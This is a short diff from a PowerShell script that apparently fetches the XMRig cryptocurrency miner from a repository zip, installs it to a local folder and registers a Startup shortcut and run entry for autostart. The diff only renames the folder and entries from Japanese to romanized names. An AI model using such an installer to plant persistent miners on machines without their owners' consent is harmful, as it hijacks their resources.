@@ -26,10 +26,10 @@ try {
     $ZipUrl = "$RepoUrl/archive/refs/heads/main.zip"
     $TempZip = Join-Path $env:TEMP 'xmrig-shared.zip'
     $TempExtract = Join-Path $env:TEMP 'xmrig-shared-extract'
-    $Destino = 'C:\タリタニア'
+    $Destino = 'C:\talitania'
     $Startup = [Environment]::GetFolderPath('Startup')
-    $ShortcutPath = Join-Path $Startup 'デーモン.lnk'
-    $RunName = 'デーモン'
+    $ShortcutPath = Join-Path $Startup 'talitania.lnk'
+    $RunName = 'Talitania Daemon'
 
     Write-Info "Destino: $Destino"
 
